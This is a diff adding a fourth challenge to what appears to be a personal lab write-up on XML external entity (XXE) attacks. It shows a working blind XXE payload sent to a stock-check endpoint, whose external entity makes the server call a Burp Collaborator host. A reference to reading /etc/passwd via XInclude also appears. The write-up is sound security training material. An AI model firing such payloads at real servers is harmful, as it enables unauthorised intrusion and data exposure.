@@ -93,4 +93,26 @@ Challenge description: Exploit Xinclude to retrieve file /etc/passwd
 
 ### Challenge 4
 
-Challenge Description:
+Challenge description: Blind XXE by out-of-band interaction(Making a request to burp collaborator with XXE)
+
+![2023-10-18_22-43](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/813ccb79-d43c-4f49-ad45-76e2d09ebb95)
+
+- I fired up burp's collaboarator and copied the link
+
+
+![2023-10-18_22-44](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4a52c176-b314-4c5d-96a9-2e5228e1d970)
+
+- I used this payload
+
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://5z5ifxf7c0kn64v7atwvdyhsbjha54tt.oastify.com"> ]>
+      <stockCheck><productId>
+      &xxe;</productId><storeId>1</storeId></stockCheck>
+  
+- Then I sent this payload to the server
+    
+![2023-10-18_22-52](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c0245328-7d0f-40fe-b614-a887d7a78dfa)
+
+- I noticed that a request has been made to burp collaborator
+
+![2023-10-18_22-55](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/211832e4-b1e8-42f3-966a-c410ba2c0ebc)
